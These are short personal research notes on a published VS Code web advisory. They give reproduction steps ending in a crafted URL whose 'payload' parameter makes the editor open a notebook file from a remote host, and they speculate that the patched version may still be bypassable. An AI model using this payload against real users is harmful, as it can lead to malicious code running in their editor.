# Notes on GHSA-pw56-c55x-cm9m
https://github.com/google/security-research/security/advisories/GHSA-pw56-c55x-cm9m

Dumb bug. but I don't use python notebooks...lately, but I am curious about how to make this happen like getting someone to visit vscode.dev, it looks like you can have local files open, but does that give the terminal permissions? even when I try to run the terminal in my local version I cannot get it to work becaus you need a local session or whatever and it isn't clear how to create one

## Repro 
Run goser.go 

1. git clone github.com/microsoft/vscode
2. git checkout -b vuln v1.71.1 # I did v1.73.1 which is supposedly patched, but the patch lets you open settings, maybe more can be done
3. Follow that https://github.com/microsoft/vscode/wiki/How-to-Contribute
4. yarn
5.  .\scripts\code-web.bat
(separate terminal)
6. npm run watch
7. visit localhost:<port>/?payload=%5B%5B%22openFile%22,%22http://<ip>:<port>/something.ipynb%22%5d%5d